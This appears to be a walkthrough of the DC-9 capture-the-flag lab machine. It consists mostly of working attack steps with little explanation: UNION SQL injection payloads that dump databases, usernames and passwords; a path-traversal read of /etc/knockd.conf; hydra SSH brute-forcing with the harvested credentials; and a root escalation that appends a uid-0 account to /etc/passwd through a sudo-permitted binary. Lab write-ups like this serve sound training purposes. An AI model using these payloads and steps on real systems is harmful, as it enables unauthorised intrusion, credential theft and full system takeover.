### DC-9

#### SQLI

databases => search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,schema_name,0x7c))+from+information_schema.schemata+--+-

|information_schema|,|Staff|,|users|

usually generic data in information_schema, lets look in users

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,table_name,0x7c))+from+information_schema.tables+where+table_schema='users'+--+-
|UserDetails|

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,column_name,0x7c))+from+information_schema.columns+where+table_name='UserDetails'+--+-
|id|,|firstname|,|lastname|,|username|,|password|,|reg_date|


Usernames and Passwords

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(username))+from+users.UserDetails+--+-
```
marym
julied
fredf
barneyr
tomc
jerrym
wilmaf
bettyr
chandlerb
joeyt
rachelg
rossg
monicag
phoebeb
scoots
janitor
janitor2
```

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,password,0x7c))+from+users.UserDetails+--+-

```
3kfs86sfd
468sfdfsd2
4sfd87sfd1
RocksOff
TC&TheBoyz
B8m#48sd
Pebbles
BamBam01
UrAG0D!
Passw0rd
yN72#dsd
ILoveRachel
3248dsds7s
smellycats
YR3BVxxxw87
Ilovepeepee
Hawaii-Five-0
transorbital
```

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,table_name,0x7c))+from+information_schema.tables+where+table_schema='Staff'+--+-
|StaffDetails|,|Users|

search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,column_name,0x7c))+from+information_schema.columns+where+table_name='Users'+--+-
|UserID|,|Username|,|Password|

search=search=adm'+union+select+1,1,1,1,1,(gRoUp_cOncaT(0x7c,Password,0x7c))+from+Staff.Users+--+-
856f5de590ef37314e7c3bdf6f8a66dc => transorbital

#### LFI

/welcome.php?file=../../../../../etc/knockd.conf

```
[openSSH]
	sequence    = 7469,8475,9842
	seq_timeout = 25
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9842,8475,7469
	seq_timeout = 25
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
```

#### SSH

`hydra -L users -P pass ssh://172.22.222.4`

```
[22][ssh] host: 172.22.222.4   login: chandlerb   password: UrAG0D!
[22][ssh] host: 172.22.222.4   login: joeyt   password: Passw0rd
[22][ssh] host: 172.22.222.4   login: janitor   password: Ilovepeepee
```

in janitor, we have

/home/janitor/.secrets-for-putin/passwords-found-on-post-it-notes.txt
```
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

`hydra -L users -P pass2 ssh://172.22.222.4`

^^ gives us the login for fredf, where we have a sudo -l, which basically reads file from one place and appends it to another file / place, so what we do in this situation is

```
fredf@dc-9:/tmp$ openssl passwd -6 -salt xyz  1234
$6$xyz$yi4TR7hO4A9BO9pNy9PTn2weMAlWj5r/joQU06UIWdIqGtI71dd10wSEo8MMskSav5eIc8c7zyqfcWOnqQ.VE/

echo "root1:\$6\$xyz\$yi4TR7hO4A9BO9pNy9PTn2weMAlWj5r/joQU06UIWdIqGtI71dd10wSEo8MMskSav5eIc8c7zyqfcWOnqQ.VE/:0:0:root:/root:/bin/bash" > newetcpasswd

fredf@dc-9:/tmp$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test

sudo /opt/devstuff/dist/test/test newetcpasswd /etc/passwd
```

this ^^ appends the new user root1 with uid(0), gid(0) to /etc/passwd with a password of 1234, which we can su into